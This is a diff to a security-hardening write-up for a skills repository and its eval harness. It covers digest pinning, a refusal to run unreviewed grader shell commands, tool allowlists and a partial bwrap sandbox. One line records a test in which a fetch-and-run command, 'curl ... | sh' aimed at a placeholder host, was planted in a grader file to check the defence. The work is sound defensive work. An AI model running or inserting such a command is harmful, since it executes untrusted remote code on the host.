@@ -100,7 +100,7 @@ is not a hash.
 **Where it fails open.** A digest goes stale and the next person bumps it to a tag for
 convenience. Dependabot does not watch a container reference inside a Markdown code block.
 
-**Landed.** `skills/github/github-actions-security/SKILL.md:241`-`:243` and `README.md:597` now
+**Landed.** `skills/github/github-actions-security/SKILL.md:241`-`:243` and `README.md:594` now
 carry `rhysd/actionlint@sha256:b1934ee5...`, the digest from `lint.yml:174`. The prose at
 `github-actions-security/SKILL.md:228`-`:232` was rewritten to state the reason where the
 command is, rather than as a rule the
@@ -109,7 +109,7 @@ command beneath it broke.
 ### 3. Run `check_evals.py` in CI
 
 `scripts/check_evals.py` is 571 lines of structural checks on the eval suites, and `lint.yml` has
-no job for it. `README.md:585` documents it as something to type.
+no job for it. `README.md:582` documents it as something to type.
 
 **What it stops.** Nothing on its own. It is listed this high purely on ratio: four lines of YAML
 put a machine between a contributor's `assertions.json` and a human's assumption that someone
@@ -145,7 +145,7 @@ it:
 
 `actionlint` and `zizmor` were run against the changed workflow, as
 `skills/github/github-actions-security/SKILL.md` requires of any workflow change, and both are
-clean. `README.md:578` was updated from four jobs to five.
+clean. `README.md:574` was updated from four jobs to five.
 
 This still stops nothing on its own, exactly as stated above. What it buys is that the slot now
 exists: a check that reads what a grader command actually does has somewhere to live, and control
@@ -153,8 +153,8 @@ exists: a check that reads what a grader command actually does has somewhere to 
 
 ### 4. Stop running graders from an unreviewed ref
 
-`evals/run_eval.py:1048` executes a string from `assertions.json` with `shell=True`. The comment at
-`:1046` justifies it by saying the command comes from a checked-in file in this repository, which is
+`evals/run_eval.py:1153` executes a string from `assertions.json` through `/bin/sh -c`. The comment at
+`:1150` justifies it by saying the command comes from a checked-in file in this repository, which is
 true of `main` and false of a pull request branch.
 
 Three options, in descending order of what they actually buy:
@@ -179,34 +179,35 @@ runs under `bypassPermissions`.
 is not a hypothetical: the whole reason to run an eval on a contributor branch is to see whether
 the contribution works.
 
-**Landed, as the refusal.** `require_reviewed_graders` at `evals/run_eval.py:980` runs before
-anything is graded, called from `cmd_tasks` (`:1927`), `cmd_agent_tasks` (`:1981`),
-`cmd_instructions_tasks` (`:2029`) and `cmd_regrade` (`:2249`), which are the only four subcommands
+**Landed, as the refusal.** `require_reviewed_graders` at `evals/run_eval.py:1083` runs before
+anything is graded, called from `cmd_tasks` (`:2030`), `cmd_agent_tasks` (`:2084`),
+`cmd_instructions_tasks` (`:2132`) and `cmd_regrade` (`:2352`), which are the only four subcommands
 that execute an assertion command.
 Four decisions in it are worth stating, because each one is a place the control could have been
 weaker:
 
-- **The baseline is `origin/main`, falling back to `main`** (`:878`). Preferring the remote means
+- **The baseline is `origin/main`, falling back to `main`** (`:981`). Preferring the remote means
   a stale local branch cannot make an unreviewed change look reviewed.
 - **The guarded set is the suite's `assertions.json`, `tasks.json`, `fixtures/` and `patches/`,
-  and `run_eval.py` itself** (`:886`). The harness decides whether, where and as what a grader
+  and `run_eval.py` itself** (`:989`). The harness decides whether, where and as what a grader
   string runs, and an assertion such as `make test` runs a file the fixture supplies, so editing
   any of them is editing what a contributor can make the machine do.
-- **The comparison is against the working tree, not `HEAD`** (`:947`). A contributor's change
+- **The comparison is against the working tree, not `HEAD`** (`:1050`). A contributor's change
   arrives committed on a branch or applied as a patch, and both produce the same shell command.
-- **The refusal prints the `workspace_command` strings that are new or changed** (`:911`, `:925`),
+- **The refusal prints the `workspace_command` strings that are new or changed** (`:1014`, `:1028`),
   and of the assertions only those: the regex kinds are matched in-process and execute nothing. It
   also lists every path that differs, since a fixture or patch change has no command to print. The
   point of the flag is that a human has read what runs, so it is put in front of them.
 
 Verified by planting `curl -s https://example.invalid/x | sh` into a suite's `assertions.json`:
 the run refused, named the file, and printed that command. The planted assertion was reverted.
-`--graders-reviewed` (`:2963`) is the waiver, and taking it is logged to stdout rather than
+`--graders-reviewed` (`:3066`) is the waiver, and taking it is logged to stdout rather than
 passing silently.
 
 **What it does not buy.** A reviewed command runs with exactly the reach it had before. This
 control decides **who chose the command**, not **what the command can reach**. The sandbox option
-above is the one that bounds reach, and it stays open. The gate also fires on the maintainer's own
+above is the one that bounds reach. It landed in part on 2026-11-27, as a `bwrap` sandbox with a
+read-only home and the network left on. The gate also fires on the maintainer's own
 uncommitted edits to a suite, which is correct and is also precisely where habit will erode it.
 Because the harness is guarded too, it fires for any local change to `run_eval.py`, including the
 ones made for controls 4 and 5.
@@ -221,7 +222,7 @@ was the default. The proposal here was to swap them, so that bypass required an 
 "the tools the run was given".
 
 **What it does not stop.** A run that legitimately needs Bash still gets Bash, and a fixture-borne
-injection then gets Bash. It also does not touch the credentials symlink at `:363`, which is a
+injection then gets Bash. It also does not touch the credentials symlink at `:367`, which is a
 separate decision: a dedicated eval credential, rotated, would be worth more than the permission
 flag.
 
@@ -233,10 +234,10 @@ implementation: `claude -p` cannot answer a permission prompt, so a task run wit
 mode has every Bash and Edit call denied, and a denied call is recorded identically to a skill that
 chose not to act. Removing the mode would not have bounded the run, it would have destroyed the
 measurement. The permission mode cannot be the control for a task run. The tool list can, so that
-is what shipped: `TASK_TOOLS` at `run_eval.py:123` allows Bash, the file tools and `Skill`, and
-`RunPermissions` at `:478` carries the tool list and the mode together so that widening the surface
-and suppressing prompts are two decisions rather than one `if/else` (`:538`-`:543`). `--all-tools`
-(`:1960`, `:2985`) restores the audited command line. The allowlist is derived from what the
+is what shipped: `TASK_TOOLS` at `run_eval.py:125` allows Bash, the file tools and `Skill`, and
+`RunPermissions` at `:579` carries the tool list and the mode together so that widening the surface
+and suppressing prompts are two decisions rather than one `if/else` (`:640`-`:645`). `--all-tools`
+(`:2063`, `:3088`) restores the audited command line. The allowlist is derived from what the
 committed transcripts show tasks actually use, and it excludes what they show runs reaching but no
 task asks for: `WebFetch` thirty times on the 2026-07-28 `github-actions-security` stamp, plus one
 `ToolSearch` and one `ScheduleWakeup`. Two caveats. Those three `github-actions-security` tasks
@@ -287,7 +288,7 @@ while only one of them is fixed.
   the `creation` rule from `:147` deliberately: with one account and no bypass actors, that rule
   would block the owner from cutting a tag at all, and restricting creation to the publishing role
   adds nothing in a repository where one account already holds the only write access.
-  `README.md:742` documents the release order and the `gh api` call that applies the ruleset.
+  `README.md:738` documents the release order and the `gh api` call that applies the ruleset.
 
 **Landed, 2026-08-30.** The tag `v0.1.0` is pushed and released, so the pinned install the
 README documents resolves, and the ruleset was applied from the file with `gh api --method POST
@@ -531,7 +532,7 @@ ref is not a meaningful construct.
 
 **Recommendation.** Deprioritize until control 6 exists. Once there are tags and something is
 published, `gh attestation verify` becomes available to consumers, which
-`github-actions-security/references/supply-chain.md:202` already teaches them to run. Adopt it then,
+`github-actions-security/references/supply-chain.md:230` already teaches them to run. Adopt it then,
 and describe it in the release notes as what it is: proof of origin, not proof of safety.
 
 **Landed, 2026-10-20, not yet exercised.** `.github/workflows/release.yml` builds an archive of the
@@ -598,7 +599,7 @@ Steps 1 to 9 are done and committed, and the two remote actions step 6 names are
 is where the work resumes, and it needs the tag from step 6, which exists as `v0.1.0`.
 
 1. **Control 2**, pin the actionlint container by digest. **Landed:**
-   `skills/github/github-actions-security/SKILL.md:241`-`:243` and `README.md:597` carry the
+   `skills/github/github-actions-security/SKILL.md:241`-`:243` and `README.md:594` carry the
    digest from `lint.yml:174`.
 2. **Control 1**, allowlist the repository root. **Landed:** `check_plugin_root` at
    `scripts/check_skills.py:719`. Attack path 1.3 is closed.
@@ -606,8 +607,9 @@ is where the work resumes, and it needs the tag from step 6, which exists as `v0
    than a permission-mode change, for the reason in that control's note. Attack path 1.2 is
    narrowed, not closed.
 4. **Control 4**, stop running graders from an unreviewed ref. **Landed** as the refusal check at
-   `evals/run_eval.py:980`. The sandbox half is deliberately not done: the refusal decides who
-   chose a grader command, and only the sandbox bounds what one can reach. Attack path 1.1 is
+   `evals/run_eval.py:1083`. The sandbox half landed in part on 2026-11-27: graders run under
+   `bwrap` with a read-only filesystem, but keep the network, the Docker socket and read access to
+   the home directory. Attack path 1.1 is
    gated, not closed.
 5. **Control 3**, run `check_evals.py` in CI. **Landed** as the `evals` job at
    `.github/workflows/lint.yml:113`. It stops nothing by itself; it is the slot where a real
